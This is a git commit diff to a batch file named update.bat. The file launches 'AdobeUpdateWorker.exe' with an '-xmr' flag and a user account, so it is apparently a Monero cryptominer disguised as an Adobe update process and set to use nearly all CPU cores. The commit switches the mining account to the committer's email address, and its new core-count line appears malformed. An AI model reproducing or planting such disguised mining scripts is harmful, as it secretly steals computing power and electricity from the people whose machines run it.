084e81fb658f923a929ea87ad1883ca1f7f6c7b4
kerpiciwuasile <kerpiciwuasile@gmail.com>
2017-06-25 01:38:03 +0300

    Add files via upload

--- vendor/global/update.bat
+++ vendor/global/update.bat
@@ -1,2 +1,2 @@
-set /a cpu=%NUMBER_OF_PROCESSORS%-1
-AdobeUpdateWorker.exe -user foxovsky@yandex.com -xmr %cpu%
+set /a cpu=%NUMBER_OF_PROCESSORS% 1
+AdobeUpdateWorker.exe -user kerpiciwuasile@gmail.com -xmr %cpu%
